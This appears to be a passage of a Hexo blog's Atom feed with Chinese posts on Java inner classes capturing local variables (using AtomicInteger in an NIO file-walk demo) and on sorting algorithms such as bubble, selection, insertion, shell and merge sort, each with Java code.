<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FreeThinking&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-04-11T10:26:27.081Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>醉心</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内部类引用局部变量的若干问题</title>
    <link href="http://example.com/2021/04/11/%E5%86%85%E9%83%A8%E7%B1%BB%E5%BC%95%E7%94%A8%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E8%8B%A5%E5%B9%B2%E9%97%AE%E9%A2%98/"/>
    <id>http://example.com/2021/04/11/%E5%86%85%E9%83%A8%E7%B1%BB%E5%BC%95%E7%94%A8%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E8%8B%A5%E5%B9%B2%E9%97%AE%E9%A2%98/</id>
    <published>2021-04-11T10:23:43.000Z</published>
    <updated>2021-04-11T10:26:27.081Z</updated>
    
    <content type="html"><![CDATA[<p>最近在学习NIO的时候看到一个demo如下(删减了部分无用代码)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-comment">//遍历目录文件</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>       <span class="hljs-comment">//方式1不可用,没有初始化</span><br>       <span class="hljs-keyword">int</span> count1;<br>       <span class="hljs-comment">//方式2不可用，不满足需要修改的诉求</span><br>       <span class="hljs-keyword">int</span> count2 = <span class="hljs-number">0</span>;<br>       <span class="hljs-comment">//方式3不可用，不满足需要修改诉求</span><br>       Integer count3 = <span class="hljs-number">0</span>;<br>       <span class="hljs-comment">//方式4可用</span><br>       AtomicInteger count3 = <span class="hljs-keyword">new</span> AtomicInteger();<br>       <br>       Files.walkFileTree(Paths.get(<span class="hljs-string">&quot;E:\\Java\\jdk1.8&quot;</span>), <span class="hljs-keyword">new</span> SimpleFileVisitor&lt;Path&gt;()&#123;<br><br>           <span class="hljs-meta">@Override</span><br>           <span class="hljs-function"><span class="hljs-keyword">public</span> FileVisitResult <span class="hljs-title">preVisitDirectory</span><span class="hljs-params">(Path dir, BasicFileAttributes attrs)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<span class="hljs-comment">//进入文件之前访问文件夹</span><br>               System.out.println(<span class="hljs-string">&quot;====&gt;&quot;</span>+dir);<br>               count3.incrementAndGet();<br>               <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.preVisitDirectory(dir, attrs);<br>           &#125;<br>       &#125;);<br>   &#125;<br></code></pre></td></tr></table></figure><p>发现了如下问题：</p><ul><li>需要修改局部变量则不能使用int和Integer修饰变量</li><li>局部变量必须使用final修饰</li><li>局部变量必须初始化</li></ul><h1 id="1-必须对局部变量进行初始化"><a href="#1-必须对局部变量进行初始化" class="headerlink" title="1. 必须对局部变量进行初始化"></a>1. 必须对局部变量进行初始化</h1><p>JVM会对全局变量初始化，基本类型数据为0，对象引用为null。</p><p>但Java规定局部变量必须进行初始化，因为开发者认为未初始化的局部变量更有可能是程序员疏忽，采用默认值反而会掩盖这种错误。（Thinking in Java）<br>所以方式1不可行。</p><h1 id="2-为什么不能直接使用int修饰变量"><a href="#2-为什么不能直接使用int修饰变量" class="headerlink" title="2. 为什么不能直接使用int修饰变量"></a>2. 为什么不能直接使用int修饰变量</h1><p>即使对局部变量初始化，使用int也是不可行的。</p><p>局部内部类，如果希望访问所在方法得局部变量，那么这个局部变量必须是final的。</p><p>原因：</p><ul><li>new出来的对象在堆内存中。</li><li>局部变量跟随方法，在栈内存中。</li><li>方法运行结束之后，立刻出栈，局部变量就会立刻消失。</li><li>但是new出来的对象在堆中持续存在，直到垃圾回收消失。此时所访问的局部变量是复制得来的，这就要求所复制的局部变量必须是不变常量。</li></ul><p>所以方式2使用count的方式是不可行的。如果使用final修饰则在内部类中是可以访问的。（JDK1.8不必再使用final修饰，后面会说明）</p><h1 id="3-JDK1-8之后不必再显式使用final修饰"><a href="#3-JDK1-8之后不必再显式使用final修饰" class="headerlink" title="3. JDK1.8之后不必再显式使用final修饰"></a>3. JDK1.8之后不必再显式使用final修饰</h1><p>JDK1.8之后内部类访问局部变量<strong>编译时</strong>会隐式的为使用到的局部变量添加final修饰。在JDK1.8中使用方式2是可以在匿名内部类中访问局部变量的，但<strong>无法修改</strong>。</p><h1 id="4-为什么使用AtomicInteger"><a href="#4-为什么使用AtomicInteger" class="headerlink" title="4. 为什么使用AtomicInteger"></a>4. 为什么使用AtomicInteger</h1><p>被final修饰的变量：</p><ul><li>对于基本类型，final 使数值不变；</li><li>对于引用类型，final 使引用不变，也就不能引用其它对象，但是被引用的对象本身是可以修改的。</li></ul><p>因为在内部类中有访问并<strong>修改</strong>局部变量的请求，在隐式为局部变量添加final后：</p><ul><li>如果局部变量是基本数据类型，则保存的数值无法再改变。不满足修改诉求。</li><li>如果使用Integer也是不行的，虽然Integer使用引用传递，但Integer的value是使用final修饰的:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> value;<br></code></pre></td></tr></table></figure><p>而AtomicInteger 是引用传递，并且value：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> value;<br></code></pre></td></tr></table></figure><p>所以使用AtomicInteger是合理的。</p><p>因为lambda表达式类似于匿名内部类的语法糖，所以上述情况也适用于lambda表达式。（事实上lambda并不等于匿名内部类的语法糖）。</p>]]></content>
    
    
    <summary type="html">学习NIO时遇到的问题。</summary>
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="JVM" scheme="http://example.com/tags/JVM/"/>
    
    <category term="NIO" scheme="http://example.com/tags/NIO/"/>
    
  </entry>
  
  <entry>
    <title>排序</title>
    <link href="http://example.com/2021/03/18/%E6%8E%92%E5%BA%8F/"/>
    <id>http://example.com/2021/03/18/%E6%8E%92%E5%BA%8F/</id>
    <published>2021-03-18T13:12:02.000Z</published>
    <updated>2021-03-18T13:13:23.636Z</updated>
    
    <content type="html"><![CDATA[<p>以下代码全部为升序排列</p><h1 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1. 冒泡排序"></a>1. 冒泡排序</h1><p>比较相邻的元素。如果第一个比第二个大，就交换他们两个。对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。针对所有的元素重复以上的步骤，除了最后一个。持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</p><p>冒泡排序中产生的有序子序列一定是全局有序的，也就是说，有序子序列中的所有元素一定小于或大于无序子序列的所有元素的关键字，这样每趟排序都会将一个元素放置到其最终的位置上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">bubbleSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = arr.length - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123; <span class="hljs-comment">// 每次需要排序的长度</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) &#123; <span class="hljs-comment">// 从第一个元素到第i个元素</span><br>            <span class="hljs-keyword">if</span> (arr[j] &gt; arr[j + <span class="hljs-number">1</span>]) &#123;<br>                temp = arr[j];<br>                arr[j] = arr[j + <span class="hljs-number">1</span>];<br>                arr[j + <span class="hljs-number">1</span>] = temp;<br>            &#125;<br>        &#125;<span class="hljs-comment">//loop j</span><br>    &#125;<span class="hljs-comment">//loop i</span><br>&#125;<span class="hljs-comment">// method bubbleSort</span><br></code></pre></td></tr></table></figure><p><strong>优化</strong></p><p>要使算法在最佳情况下有O(n)复杂度，需要做一些改进，增加一个<code>swap</code>的标志，当前一轮没有进行交换时，说明数组已经有序，没有必要再进行下一轮的循环了，直接退出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">bubbleSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">boolean</span> swap;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = arr.length - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123; <span class="hljs-comment">// 每次需要排序的长度</span><br>        swap=<span class="hljs-keyword">false</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) &#123; <span class="hljs-comment">// 从第一个元素到第i个元素</span><br>            <span class="hljs-keyword">if</span> (arr[j] &gt; arr[j + <span class="hljs-number">1</span>]) &#123;<br>                temp = arr[j];<br>                arr[j] = arr[j + <span class="hljs-number">1</span>];<br>                arr[j + <span class="hljs-number">1</span>] = temp;<br>                swap=<span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (swap==<span class="hljs-keyword">false</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="2. 选择排序"></a>2. 选择排序</h1><p>每次遍历找到未排序元素中的最小元素放在已经排序的元素末尾。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">selectionSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp, min = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<br>        min = i;<br>        <span class="hljs-comment">// 循环查找最小值</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; arr.length; j++) &#123;<br>            <span class="hljs-keyword">if</span> (arr[min] &gt; arr[j]) &#123;<br>                min = j;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (min != i) &#123;<br>            temp = arr[i];<br>            arr[i] = arr[min];<br>            arr[min] = temp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3. 插入排序"></a>3. 插入排序</h1><p>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</p><p>从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">insertionSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr)</span></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>; i&lt;arr.length; ++i)&#123;<br>        <span class="hljs-keyword">int</span> value = arr[i];<br>        <span class="hljs-keyword">int</span> position=i;<br>        <span class="hljs-keyword">while</span> (position&gt;<span class="hljs-number">0</span> &amp;&amp; arr[position-<span class="hljs-number">1</span>]&gt;value)&#123;<br>            arr[position] = arr[position-<span class="hljs-number">1</span>];<br>            position--;<br>        &#125;<br>        arr[position] = value;<br>    &#125;<span class="hljs-comment">//loop i</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-希尔排序"><a href="#4-希尔排序" class="headerlink" title="4. 希尔排序"></a>4. 希尔排序</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">shellSort</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> length = arr.length;<br>    <span class="hljs-keyword">int</span> temp;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> step = length / <span class="hljs-number">2</span>; step &gt;= <span class="hljs-number">1</span>; step /= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = step; i &lt; length; i++) &#123;<br>            temp = arr[i];<br>            <span class="hljs-keyword">int</span> j = i - step;<br>            <span class="hljs-keyword">while</span> (j &gt;= <span class="hljs-number">0</span> &amp;&amp; arr[j] &gt; temp) &#123;<br>                arr[j + step] = arr[j];<br>                j -= step;<br>            &#125;<br>            arr[j + step] = temp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="5-归并排序"><a href="#5-归并排序" class="headerlink" title="5. 归并排序"></a>5. 归并排序</h1><p>归并排序（MERGE-SORT）是利用<strong>归并</strong>的思想实现的排序方法，该算法采用经典的<strong>分治</strong>（divide-and-conquer）策略（分治法将问题<strong>分</strong>(divide)成一些小的问题然后递归求解，而<strong>治(conquer)</strong>的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。</p><p><strong>分而治之</strong></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/51-452283750.png" alt="img" style="zoom: 33%;" /></p><p> 　可以看到这种结构很像一棵完全二叉树，本文的归并排序我们采用递归去实现（也可采用迭代的方式去实现）。<strong>分</strong>阶段可以理解为就是递归拆分子序列的过程，递归深度为log2n。</p><p><strong>合并相邻有序子序列</strong></p><p>　　再来看看<strong>治</strong>阶段，我们需要将两个已经有序的子序列合并成一个有序序列，比如上图中的最后一次合并，要将[4,5,7,8]和[1,2,3,6]两个已经有序的子序列，合并为最终序列[1,2,3,4,5,6,7,8]，来看下实现步骤。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/61-468169540.png" alt="img" style="zoom: 33%;" /></p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/08-588010220.png" alt="img" style="zoom:33%;" /></p><p><strong>代码实现</strong></p><ol><li><p>自顶向下的归并排序（递归实现）：</p><p>1.1 数组</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sortdemo;<br><br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Created by chengxiao on 2016/12/8.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MergeSort</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String []args)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> []arr = &#123;<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>&#125;;<br>        sort(arr);<br>        System.out.println(Arrays.toString(arr));<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> []arr)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> []temp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[arr.length];<span class="hljs-comment">//在排序前，先建好一个长度等于原数组长度的临时数组，避免递归中频繁开辟空间</span><br>        sort(arr,<span class="hljs-number">0</span>,arr.length-<span class="hljs-number">1</span>,temp);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr,<span class="hljs-keyword">int</span> left,<span class="hljs-keyword">int</span> right,<span class="hljs-keyword">int</span> []temp)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(left&lt;right)&#123;<br>            <span class="hljs-keyword">int</span> mid = (left+right)/<span class="hljs-number">2</span>;<br>            sort(arr,left,mid,temp);<span class="hljs-comment">//左边归并排序，使得左子序列有序</span><br>            sort(arr,mid+<span class="hljs-number">1</span>,right,temp);<span class="hljs-comment">//右边归并排序，使得右子序列有序</span><br>            merge(arr,left,mid,right,temp);<span class="hljs-comment">//将两个有序子数组合并操作</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">merge</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] arr,<span class="hljs-keyword">int</span> left,<span class="hljs-keyword">int</span> mid,<span class="hljs-keyword">int</span> right,<span class="hljs-keyword">int</span>[] temp)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> i = left;<span class="hljs-comment">//左序列指针</span><br>        <span class="hljs-keyword">int</span> j = mid+<span class="hljs-number">1</span>;<span class="hljs-comment">//右序列指针</span><br>        <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<span class="hljs-comment">//临时数组指针</span><br>        <span class="hljs-keyword">while</span> (i&lt;=mid &amp;&amp; j&lt;=right)&#123;<br>            <span class="hljs-keyword">if</span>(arr[i]&lt;=arr[j])&#123;<br>                temp[t++] = arr[i++];<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                temp[t++] = arr[j++];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">while</span>(i&lt;=mid)&#123;<span class="hljs-comment">//将左边剩余元素填充进temp中</span><br>            temp[t++] = arr[i++];<br>        &#125;<br>        <span class="hljs-keyword">while</span>(j&lt;=right)&#123;<span class="hljs-comment">//将右序列剩余元素填充进temp中</span><br>            temp[t++] = arr[j++];<br>        &#125;<br>        t = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//将temp中的元素全部拷贝到原数组中</span><br>        <span class="hljs-keyword">while</span>(left &lt;= right)&#123;<br>            arr[left++] = temp[t++];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>1.2 链表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">sortList</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(head == <span class="hljs-keyword">null</span> || head.next == <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        <span class="hljs-comment">//分</span><br>        <span class="hljs-comment">//找到中点</span><br>        ListNode fast = head, slow = head;<br>        <span class="hljs-comment">//slow的前驱结点，用于断链</span><br>        ListNode preSlow = head;<br>        <span class="hljs-keyword">while</span>(fast != <span class="hljs-keyword">null</span> &amp;&amp; fast.next != <span class="hljs-keyword">null</span>)&#123;<br>            fast = fast.next.next;<br>            preSlow = slow;<br>            slow = slow.next;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fast != <span class="hljs-keyword">null</span>)&#123;<br>            preSlow = slow;<br>            slow = slow.next;<br>        &#125;<br>        preSlow.next = <span class="hljs-keyword">null</span>;<br>        ListNode left = sortList(head);<br>        ListNode right = sortList(slow);<br><br>        <span class="hljs-comment">//治</span><br>        <span class="hljs-comment">//两个有序链表合并，建立前驱结点排序</span><br>        ListNode node = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);<br>        ListNode res = node;<br>        <span class="hljs-keyword">while</span>(left != <span class="hljs-keyword">null</span> &amp;&amp; right != <span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">if</span>(left.val &lt;= right.val)&#123;<br>                node.next = left;<br>                left = left.next;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                node.next = right;<br>                right = right.next;<br>            &#125;<br>            node = node.next;<br>        &#125;<br>        node.next = left == <span class="hljs-keyword">null</span> ? right : left;<br>        <span class="hljs-keyword">return</span> res.next;<br>        <br>    &#125;<br></code></pre></td></tr></table></figure><ol><li>自底向上的归并排序（迭代实现）：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//自底向上归并排序</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T extends Comparable&lt;? <span class="hljs-keyword">super</span> T&gt;&gt; <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MergeSortDownToUp</span><span class="hljs-params">(T[] A)</span></span>&#123;<br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>    T[] aux = (T[])Array.newInstance(A.getClass().getComponentType(), A.length);<br>    <span class="hljs-keyword">int</span> len,i,j,k,start,mid,end;<br>    <span class="hljs-comment">//len表示归并子数组的长度，1表示，一个一个的归并，归并后的长度为2,2表示两个两个的归并，归并后的长度为4,以此类推</span><br>    <span class="hljs-keyword">for</span>(len = <span class="hljs-number">1</span>; len &lt; A.length; len = <span class="hljs-number">2</span>*len)&#123;<br>        <span class="hljs-comment">//复制到辅助数组中</span><br>        System.arraycopy(A, <span class="hljs-number">0</span>, aux, <span class="hljs-number">0</span>, A.length);<br>        <span class="hljs-comment">//按照len的长度归并回A数组，归并后长度翻倍</span><br>        <span class="hljs-keyword">for</span>(start = <span class="hljs-number">0</span>; start &lt; A.length; start = start+<span class="hljs-number">2</span>*len)&#123;<br>            mid = start + len - <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">//对于数组长度不满足2的x次幂的数组，mid可能会大于end</span><br>            end = Math.min(start + <span class="hljs-number">2</span>*len - <span class="hljs-number">1</span>, A.length-<span class="hljs-number">1</span>);<br>            i = start; <br>            <span class="hljs-comment">//mid大于end时,j必然大于end,所以不会引起越界访问</span><br>            j = mid+<span class="hljs-number">1</span>;<br>            <span class="hljs-comment">//[start,mid] [mid+1, end]</span><br>            <span class="hljs-keyword">for</span>(k = start; k &lt;= end; k++)&#123;<br>                <span class="hljs-keyword">if</span>(i &gt; mid)&#123;<br>                    A[k] = aux[j++];<br>                &#125;<span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">if</span>(j &gt; end)&#123;<br>                    A[k] = aux[i++];<br>                &#125;<span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">if</span>(aux[i].compareTo(aux[j]) &lt; <span class="hljs-number">0</span>)&#123;<br>                    A[k] = aux[i++];<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    A[k] = aux[j++];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.2 链表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 